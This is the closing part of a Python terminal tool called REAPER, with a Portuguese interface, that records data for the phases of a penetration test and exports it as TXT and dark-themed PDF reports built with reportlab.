    for (fkey, flabel) in ph["fields"]:
        current = phase_data.get(fkey, "")
        display = (f"[dim](actual: {current[:55]}...)[/dim]" if len(current) > 55
                   else f"[dim](actual: {current})[/dim]" if current
                   else "[dim](vazio)[/dim]")
        console.print(f"[{color}]{flabel}[/{color}] {display}")
        val = Prompt.ask("  ▶", default="").strip()
        if val.upper() == "LIMPAR":
            phase_data[fkey] = ""
        elif val:
            phase_data[fkey] = val

    PROJECT["phases"][str(ph["id"])] = phase_data
    save_project()
    console.print(f"\n[green]✔ Dados guardados.[/green]")
    pause()

# ── Ver dados ────────────────────────────────────────────────
def view_phase_data(ph, color):
    banner()
    console.print(Panel(
        f"[{color}]{ph['icon']} FASE {ph['id']} — {ph['name']} › DADOS[/{color}]",
        border_style=color))
    console.print()
    phase_data = PROJECT["phases"].get(str(ph["id"]), {})
    t = Table(box=box.ROUNDED, border_style=color, show_lines=True)
    t.add_column("Campo", style=f"bold {color}", width=24)
    t.add_column("Valor", style="white",          width=58)
    for (fkey, flabel) in ph["fields"]:
        v = phase_data.get(fkey, "")
        t.add_row(flabel, v if v else "[dim]—[/dim]")
    console.print(t)
    pause()

# ── Menu Relatório ───────────────────────────────────────────
def report_menu():
    banner()
    console.print(Panel("[bold blue]📄 GERAR RELATÓRIO[/bold blue]", border_style="blue"))
    if not PROJECT["name"]:
        console.print("[yellow]Cria ou carrega um projecto primeiro.[/yellow]")
        pause(); return
    console.print()
    menu = Table(box=box.SIMPLE, show_header=False, padding=(0,2))
    menu.add_column(style="bold blue", width=6); menu.add_column()
    menu.add_row("[1]", "Relatório TXT")
    menu.add_row("[2]", "Relatório PDF (reportlab)")
    menu.add_row("[B]", "Voltar")
    console.print(menu)
    ch = Prompt.ask("[blue]REAPER › Relatório[/blue]").strip().upper()
    if ch == "1": generate_txt_report()
    elif ch == "2": generate_pdf_report()

# ── Relatório TXT ─────────────────────────────────────────────
def generate_txt_report():
    banner()
    now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M")
    lines = ["="*70,
             "  REAPER — Recon, Exploit, Analysis & Post-exploitation Reporting Engine",
             "  Autor: DarkReaper", "="*70,
             f"  Projecto : {PROJECT['name']}",
             f"  Alvo     : {PROJECT['target']}",
             f"  Data     : {PROJECT['date']}  |  Gerado em: {now}",
             "="*70, ""]
    for ph in PHASES:
        lines += ["─"*70, f"  FASE {ph['id']} — {ph['name']}", f"  {ph['desc']}", "─"*70]
        phase_data = PROJECT["phases"].get(str(ph["id"]), {})
        for (fkey, flabel) in ph["fields"]:
            lines.append(f"  {flabel:<32}: {phase_data.get(fkey, '—')}")
        lines.append("")
    lines += ["="*70, "  FIM DO RELATÓRIO", "="*70]
    report = "\n".join(lines)
    console.print(report)
    safe  = PROJECT["name"].replace(" ","_").replace("/","-")
    fname = f"reaper_report_{safe}_{PROJECT['date']}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(report)
    console.print(f"\n[green]✔ Relatório guardado:[/green] [bold]{fname}[/bold]")
    pause()

# ── Relatório PDF ─────────────────────────────────────────────
def generate_pdf_report():
    try:
        from reportlab.lib.pagesizes import A4
        from reportlab.lib.units import mm
        from reportlab.lib.styles import ParagraphStyle
        from reportlab.lib.enums import TA_CENTER
        from reportlab.platypus import (SimpleDocTemplate, Paragraph, Spacer,
            Table as RLTable, TableStyle, HRFlowable, PageBreak, KeepTogether)
        from reportlab.lib.colors import HexColor
    except ImportError:
        console.print("[red]Instala reportlab: pip install reportlab --break-system-packages[/red]")
        pause(); return

    BG    = HexColor("#0d1117"); CARD  = HexColor("#161b22")
    GREY2 = HexColor("#21262d"); BORDER= HexColor("#30363d")
    ACCENT= HexColor("#e63946"); WHITE = HexColor("#e6edf3")
    GREY  = HexColor("#8b949e"); GREEN = HexColor("#39d353")
    PH_C  = [HexColor(c) for c in [
        "#00d4ff","#39d353","#bc8cff","#e3b341","#f85149","#ff6b35","#1f6feb"]]

    safe  = PROJECT["name"].replace(" ","_").replace("/","-")
    fname = f"reaper_report_{safe}_{PROJECT['date']}.pdf"
    W, H  = A4

    def ps(n,**kw): return ParagraphStyle(n,**kw)
    S = {
        "title": ps("t", fontName="Helvetica-Bold", fontSize=22, textColor=ACCENT,  alignment=TA_CENTER, spaceAfter=4),
        "sub":   ps("s", fontName="Helvetica",      fontSize=10, textColor=WHITE,   alignment=TA_CENTER, spaceAfter=2),
        "meta":  ps("m", fontName="Helvetica",      fontSize=7,  textColor=GREY,    alignment=TA_CENTER, spaceAfter=2),
        "h2":    ps("h", fontName="Helvetica-Bold", fontSize=11, textColor=WHITE,   spaceBefore=6, spaceAfter=3),
        "body":  ps("b", fontName="Helvetica",      fontSize=9,  textColor=WHITE,   spaceAfter=3, leading=13),
        "small": ps("sm",fontName="Helvetica",      fontSize=7,  textColor=GREY,    alignment=TA_CENTER),
    }

    doc = SimpleDocTemplate(fname, pagesize=A4,
        leftMargin=15*mm, rightMargin=15*mm, topMargin=20*mm, bottomMargin=20*mm)
    story = []
    now   = datetime.datetime.now().strftime("%d/%m/%Y %H:%M")

    # Capa
    story += [Spacer(1,18*mm), Paragraph("REAPER", S["title"]),
              Paragraph("Recon · Exploit · Analysis · Post-exploitation · Reporting Engine", S["sub"]),
              HRFlowable(width="100%", thickness=1, color=ACCENT), Spacer(1,5*mm)]

    meta = RLTable([
        ["Projecto", PROJECT["name"],  "Alvo",    PROJECT["target"]],
        ["Analista", "DarkReaper",       "Data",    PROJECT["date"]],
        ["Gerado",   now,              "",        ""],
    ], colWidths=[28*mm, 72*mm, 24*mm, 56*mm])
    meta.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(-1,-1),CARD), ("TEXTCOLOR",(0,0),(0,-1),GREY),
        ("TEXTCOLOR",(2,0),(2,-1),GREY),   ("TEXTCOLOR",(1,0),(1,-1),WHITE),
        ("TEXTCOLOR",(3,0),(3,-1),WHITE),  ("FONTNAME",(0,0),(-1,-1),"Helvetica"),
        ("FONTNAME",(0,0),(0,-1),"Helvetica-Bold"), ("FONTNAME",(2,0),(2,-1),"Helvetica-Bold"),
        ("FONTSIZE",(0,0),(-1,-1),8), ("ROWBACKGROUNDS",(0,0),(-1,-1),[CARD,GREY2]),
        ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
    ]))
    story += [meta, Spacer(1,6*mm)]

    # Sumário
    story.append(Paragraph("SUMÁRIO DE FASES", S["h2"]))
    sd = [["Fase","Nome","Estado"]]
    for ph in PHASES:
        pd2   = PROJECT["phases"].get(str(ph["id"]),{})
        fill  = len([v for v in pd2.values() if str(v).strip()])
        total = len(ph["fields"])
        estado= f"Completo ({fill}/{total})" if fill==total else \
                f"Parcial ({fill}/{total})"  if fill>0 else "Não preenchido"
        sd.append([str(ph["id"]), ph["name"], estado])
    st = RLTable(sd, colWidths=[14*mm,90*mm,76*mm])
    st.setStyle(TableStyle([
        ("BACKGROUND",(0,0),(-1,0),ACCENT), ("TEXTCOLOR",(0,0),(-1,0),WHITE),
        ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),8),
        ("ROWBACKGROUNDS",(0,1),(-1,-1),[CARD,GREY2]), ("TEXTCOLOR",(0,1),(-1,-1),WHITE),
        ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
        ("ALIGN",(0,0),(0,-1),"CENTER"),
    ]))
    story += [st, PageBreak()]

    # Fases
    for ph in PHASES:
        pc        = PH_C[ph["id"]-1]
        phase_data= PROJECT["phases"].get(str(ph["id"]),{})
        dark_text = HexColor("#0d1117")

        hdr = RLTable([[f"  FASE {ph['id']}  —  {ph['name']}  {ph['icon']}"]], colWidths=[180*mm])
        hdr.setStyle(TableStyle([
            ("BACKGROUND",(0,0),(-1,-1),pc), ("TEXTCOLOR",(0,0),(-1,-1),dark_text),
            ("FONTNAME",(0,0),(-1,-1),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),12),
            ("PADDING",(0,0),(-1,-1),8),
        ]))
        story += [KeepTogether([hdr, Spacer(1,2*mm)]), Paragraph(ph["desc"], S["body"]), Spacer(1,3*mm)]

        # Dados
        story.append(Paragraph("DADOS DO TESTE", ParagraphStyle("h3",
            fontName="Helvetica-Bold", fontSize=9, textColor=pc, spaceAfter=3, spaceBefore=4)))
        dr = [["Campo","Valor"]]
        for (fk, fl) in ph["fields"]:
            dr.append([fl, phase_data.get(fk,"") or "—"])
        dt = RLTable(dr, colWidths=[55*mm,125*mm])
        dt.setStyle(TableStyle([
            ("BACKGROUND",(0,0),(-1,0),pc), ("TEXTCOLOR",(0,0),(-1,0),dark_text),
            ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),8),
            ("ROWBACKGROUNDS",(0,1),(-1,-1),[CARD,GREY2]),
            ("TEXTCOLOR",(0,1),(0,-1),GREY), ("TEXTCOLOR",(1,1),(-1,-1),WHITE),
            ("FONTNAME",(0,1),(0,-1),"Helvetica-Bold"),
            ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),5),
            ("VALIGN",(0,0),(-1,-1),"TOP"),
        ]))
        story += [dt, Spacer(1,4*mm)]

        # Ferramentas de referência
        phase_tools = TOOL_DEFINITIONS.get(ph["id"], [])
        if phase_tools:
            story.append(Paragraph("FERRAMENTAS DE REFERÊNCIA", ParagraphStyle("h3b",
                fontName="Helvetica-Bold", fontSize=9, textColor=pc, spaceAfter=3)))
            tr = [["Ferramenta","Comando","Parâmetros necessários"]]
            for tool in phase_tools:
                param_list = ", ".join(p["label"] for p in tool["params"]) if tool["params"] else "—"
                tr.append([tool["name"], tool["cmd"], param_list])
            tt = RLTable(tr, colWidths=[30*mm,90*mm,60*mm])
            tt.setStyle(TableStyle([
                ("BACKGROUND",(0,0),(-1,0),GREY2), ("TEXTCOLOR",(0,0),(-1,0),pc),
                ("FONTNAME",(0,0),(-1,0),"Helvetica-Bold"), ("FONTSIZE",(0,0),(-1,-1),7),
                ("ROWBACKGROUNDS",(0,1),(-1,-1),[HexColor("#0d1117"),CARD]),
                ("TEXTCOLOR",(0,1),(0,-1),WHITE), ("TEXTCOLOR",(1,1),(1,-1),GREEN),
                ("TEXTCOLOR",(2,1),(2,-1),GREY),  ("FONTNAME",(1,1),(1,-1),"Courier"),
                ("GRID",(0,0),(-1,-1),0.3,BORDER), ("PADDING",(0,0),(-1,-1),4),
                ("VALIGN",(0,0),(-1,-1),"TOP"),
            ]))
            story.append(tt)
        story.append(PageBreak())

    story += [HRFlowable(width="100%",thickness=1,color=ACCENT), Spacer(1,3*mm),
              Paragraph(f"REAPER — Relatório Final  |  DarkReaper  |  {now}", S["small"])]

    def dark_bg(c, d):
        c.saveState(); c.setFillColor(BG)
        c.rect(0, 0, W, H, fill=1, stroke=0); c.restoreState()

    doc.build(story, onFirstPage=dark_bg, onLaterPages=dark_bg)
    console.print(f"\n[green]✔ PDF gerado:[/green] [bold]{fname}[/bold]")
    pause()

# ── Entry point ──────────────────────────────────────────────
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        console.print("\n\n[bold red]Interrompido. Sessão terminada.[/bold red]\n")
        sys.exit(0)
